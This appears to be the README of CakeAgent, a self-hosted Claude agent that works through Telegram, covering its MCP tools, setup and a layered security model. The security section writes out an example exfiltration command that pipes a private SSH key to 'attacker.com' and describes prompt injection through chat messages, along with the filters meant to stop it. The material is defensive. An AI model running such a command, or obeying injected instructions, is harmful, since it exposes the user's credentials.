# 🍰 CakeAgent

**A personal AI agent in 1,600 lines of code.**

CakeAgent runs Claude as a full-blown agent on your server — with tool use, web search, code execution, file access, scheduling, voice, and an MCP integration ecosystem — all through Telegram. Single Node.js process. 3 dependencies. Zero external API keys.

---

## Why CakeAgent Exists

Every open-source AI assistant arrives pre-bloated. 50+ dependencies, Docker Compose stacks, Redis queues, WebSocket servers, custom plugin systems, and web dashboards — before you've sent a single message. They reinvent capabilities that already exist elsewhere, then lock you into their abstractions.

CakeAgent takes the opposite approach: **do almost nothing yourself, and let the ecosystem do the rest.**

The core is a thin orchestrator (~1,600 LOC) that connects Telegram via raw `fetch()` to the Claude Agent SDK. That's it. Everything else — calendar, email, GitHub, Slack, databases, APIs — comes from the **MCP ecosystem**. Thousands of ready-made tool servers, discoverable and installable via chat, no code changes required. Instead of building a plugin system, CakeAgent plugs into the one that already exists.

### What's different

| | CakeAgent | Typical AI assistant frameworks |
|---|---|---|
| **Dependencies** | 3 | 30–100+ |
| **Source code** | ~1,600 LOC | 10K–50K+ LOC |
| **Network listeners** | 0 (outbound only) | HTTP server, WebSocket, Redis |
| **Telegram integration** | 200 LOC raw `fetch()`, 0 deps | Framework + adapter + middleware |
| **Tool ecosystem** | MCP — thousands of servers, install via chat | Custom plugin SDK, build everything yourself |
| **Permission model** | `acceptEdits` + PreToolUse hooks | `bypassPermissions` (YOLO) or nothing |
| **Configuration** | Via Telegram chat | Config files, web UI, env vars, YAML |
| **Memory** | Injected into every prompt | Vector DB, embeddings, semantic search |

### Technical bets that paid off

**1. MCP as the extension model.** Other assistants build plugin systems from scratch — SDKs, marketplaces, custom protocols. CakeAgent uses MCP (Model Context Protocol), an open standard backed by Anthropic with thousands of existing servers. Google Calendar, GitHub, Slack, Jira, databases, email — all installable via a single chat message. The agent queries the official registry, shows you what's available, and writes to `.mcp.json` on confirmation. No code changes, no restarts.

**2. Telegram via raw `fetch()`.** CakeAgent uses 8 Telegram Bot API endpoints. grammY, Telegraf, and node-telegram-bot-api are designed for multi-user bots with concurrent handlers and middleware chains. CakeAgent is a single-user agent that processes one message at a time. A 200-line raw `fetch()` adapter gives full control, zero transitive dependencies, and is trivially auditable.

**3. In-process MCP via `createSdkMcpServer`.** The standard pattern spawns MCP servers as child processes communicating via stdio, requiring a separate dependency and filesystem-based IPC. CakeAgent uses the Agent SDK's built-in `createSdkMcpServer()` — tools run in the same process. Side effects are intercepted via `PostToolUse` hooks with closure-shared state. No child process. No IPC. No extra dependency.

**4. Layered security over trust.** Most self-hosted AI assistants use `bypassPermissions` — full OS access gated only by a system prompt that says "please don't do bad things." CakeAgent uses `acceptEdits` (files allowed, Bash gated) + `PreToolUse` hooks (command validation) + protected CLAUDE.md (read-only instructions) + sanitized memory + audit logging. No single layer is unbreakable. Together, they make exploitation meaningfully harder.

---

## ✨ Features

- 💬 **Telegram** — DM + group chats with trigger words
- 🧠 **Persistent memory** — learns preferences, cleans up stale entries automatically
- 🔧 **MCP ecosystem** — discover and install tools via chat (Calendar, GitHub, Slack, etc.)
- ⏰ **Scheduling** — recurring and one-time tasks
- 🎙️ **Voice** — local Whisper STT + Edge TTS (no API keys)
- ⚙️ **Settings via Telegram** — inline keyboards, zero API cost
- 🔒 **Layered security** — not "please don't" in a prompt, but actual code-level enforcement
- 🪶 **~1,600 LOC** — 9 files, 3 deps, you can read the entire codebase in an hour

---

## 🚀 Setup

```bash
git clone https://github.com/youruser/cakeagent.git
cd cakeagent
bash setup.sh
```

The script walks you through:
1. **Telegram bot token** — links you to [@BotFather](https://t.me/BotFather)
2. **Your Telegram user ID** — links you to [@userinfobot](https://t.me/userinfobot)
3. **Claude auth** — subscription login (preferred, opens a URL) or API key
4. Installs, builds, and optionally sets up a **systemd service**

After that, send a message to your bot. CakeAgent guides you through the rest — name, personality, voice, integrations — via Telegram chat.

### Manual setup

```bash
cp .env.example .env && chmod 600 .env
nano .env                               # Bot token + chat ID
claude login                            # Or set ANTHROPIC_API_KEY in .env
npm install && npm run build
sudo cp cakeagent.service /etc/systemd/system/
sudo systemctl enable --now cakeagent
```

```bash
sudo journalctl -u cakeagent -f         # Live logs
sudo systemctl restart cakeagent        # Restart
```

---

## 🏗️ Architecture

```
┌─────────────┐     ┌──────────────┐     ┌────────────────┐
│  Telegram    │────▶│  Orchestrator │────▶│  Claude Agent   │
│  (raw fetch) │◀────│  (index.ts)   │◀────│  SDK query()    │
└─────────────┘     └──────┬───────┘     └───────┬────────┘
                           │                      │
                    ┌──────┴───────┐       ┌──────┴────────┐
                    │   SQLite     │       │  MCP Tools     │
                    │  (store.ts)  │       │  (in-process)  │
                    └──────────────┘       └───────────────┘
```

**Three layers of interception** — most interactions never touch the Claude API:

1. **Callback queries** (inline keyboard) → update settings directly → zero cost
2. **Chat commands** (`/status`, `/settings`, `/reset`) → handled in orchestrator → zero cost
3. **Regular messages** → routed to Claude agent → API cost

### File map

```
src/index.ts        406 LOC  Orchestrator: routing, scheduler, shutdown
src/tools.ts        296 LOC  In-process MCP server (16 tools)
src/store.ts        213 LOC  SQLite: messages, schedules, groups, audit
channels/telegram.ts 203 LOC  Raw fetch Telegram adapter
src/hooks.ts        148 LOC  Security hooks + conversation archival
src/types.ts        142 LOC  Type definitions
src/voice.ts        128 LOC  Local Whisper STT + Edge TTS
src/agent.ts         71 LOC  Claude Agent SDK wrapper
src/config.ts        51 LOC  .env parser
```

---

## 🔌 MCP Integrations

CakeAgent queries the [official MCP Registry](https://registry.modelcontextprotocol.io) to discover tools:

```
You:       "Find an MCP server for Google Calendar"
CakeAgent: Found 3 servers:
            1. @anthropic/google-calendar-mcp (verified) ...
           Install #1?
You:       "Yes"
CakeAgent: Installed. Available on your next message.
```

Servers are stored in `.mcp.json` and loaded automatically per invocation — no restart. Command validation ensures only safe executors (`npx`, `node`, `python`, `uvx`, `docker`).

### Built-in tools

| Tool | What it does |
|------|-------------|
| `send_message` | Mid-conversation messages (progress updates) |
| `schedule_task` | Recurring / one-time tasks with cron or intervals |
| `search_mcp_registry` | Query the official MCP Registry |
| `install_tool` / `remove_tool` | Manage MCP servers via `.mcp.json` |
| `update_settings` | Change model, thinking level, voice, etc. |
| `register_group` | Add Telegram group chats with trigger words |
| `update_memory` / `rewrite_memory` | Persistent memory management |
| `list_tools` / `list_groups` / `list_schedules` | Inspect state |

---

## 🎙️ Voice

| Component | Provider | Cost |
|-----------|----------|------|
| STT | **whisper.cpp** (local, on-device) | Free |
| TTS | **Edge TTS** (Microsoft) | Free |

No API keys. No cloud transcription. Voice notes are processed locally.

```bash
sudo apt install whisper-cpp ffmpeg     # STT dependencies
npm i edge-tts                          # TTS (optional)
mkdir -p data/models
# Download the base model from whisper.cpp/models/:
cd /usr/share/whisper-cpp/models && ./download-ggml-model.sh base
cp ggml-base.bin /path/to/cakeagent/data/models/
```

---

## 🔒 Security Model

CakeAgent's security is layered — no single point of failure:

| Layer | What it does |
|-------|-------------|
| **No network listeners** | Outbound-only. Telegram long poll + MCP registry fetch. No ports open. |
| **Chat ID + sender allowlist** | Only configured Telegram chats and senders can trigger the agent. |
| **`acceptEdits` permissions** | File operations auto-approved. Bash commands gated by hooks. |
| **PreToolUse Bash validator** | Regex-based command filter blocks shell injection, reverse shells, pipe-to-sh. |
| **Protected CLAUDE.md** | Agent cannot modify its own instructions. PreToolUse hook denies Write/Edit to CLAUDE.md, .env, credentials/. |
| **Sanitized memory** | `update_memory` strips prompt injection patterns before writing. |
| **Conversation archival** | PreCompact hook saves transcripts before SDK context compaction. |
| **Persistent rate limiting** | SQLite-backed, survives restarts. Per-sender. |
| **Concurrency guard** | `agentBusy` flag prevents scheduler + user message from running agents simultaneously. |
| **Audit trail** | Every Bash command, every file write denial, every tool install → SQLite audit table. |
| **`maxTurns: 25`** | Prevents runaway agent loops from burning API quota. |
| **systemd hardening** | `NoNewPrivileges`, `ProtectSystem=strict`, `PrivateTmp`, restricted write paths. |

### Why not `bypassPermissions`?

Most self-hosted Claude agents use `permissionMode: 'bypassPermissions'` because it's the easiest way to make everything work. The SDK docs even suggest it for personal use.

The problem: `bypassPermissions` ignores `allowedTools` entirely. Every tool is auto-approved. A prompt injection in a Telegram message → the agent runs `cat ~/.ssh/id_rsa | curl attacker.com` with zero resistance. The only defense is a system prompt saying "don't do bad things."

CakeAgent uses `acceptEdits` — file ops are auto-approved (the agent needs them), but Bash goes through a PreToolUse hook that validates the command before execution. It's not a perfect boundary (no regex can catch every shell trick), but it catches 90%+ of automated injection patterns and logs everything for review.

---

## 📝 Telegram Commands

| Command | Description | API Cost |
|---------|-------------|----------|
| `/status` | Model, uptime, active tasks | Free |
| `/settings` | Inline keyboard for model, thinking, voice | Free |
| `/reset` | Clear conversation session | Free |
| `/help` | List commands | Free |

---

## 🤝 Contributing

CakeAgent is intentionally small. Before adding a feature, ask: can the agent do this via an MCP server instead? If yes, don't add it to CakeAgent — install the MCP server.

The entire codebase fits in one context window. Read it before submitting a PR.

## 📄 License

MIT
